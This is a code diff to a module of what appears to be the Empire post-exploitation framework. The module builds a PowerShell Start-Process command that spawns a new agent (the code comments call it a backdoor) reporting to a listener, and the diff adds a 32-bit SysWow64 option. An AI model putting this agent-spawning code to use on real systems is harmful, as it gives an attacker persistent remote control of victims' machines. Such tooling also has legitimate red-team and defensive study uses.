@@ -38,6 +38,11 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'SysWow64' : {
+                'Description'   :   'Switch. Spawn a SysWow64 (32-bit) powershell.exe.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },            
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -73,6 +78,7 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        sysWow64 = self.options['SysWow64']['Value']
 
         isEmpire = self.mainMenu.listeners.is_listener_empire(listenerName)
         if not isEmpire:
@@ -88,9 +94,13 @@ class Module:
         else:
             # transform the backdoor into something launched by powershell.exe
             # so it survives the agent exiting  
-            stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
+            if sysWow64.lower() == "true":
+                stagerCode = "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
+            else:
+                stagerCode = "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher
+
             parts = stagerCode.split(" ")
 
-            code = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listenerName)
+            code = "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listenerName)
 
             return code
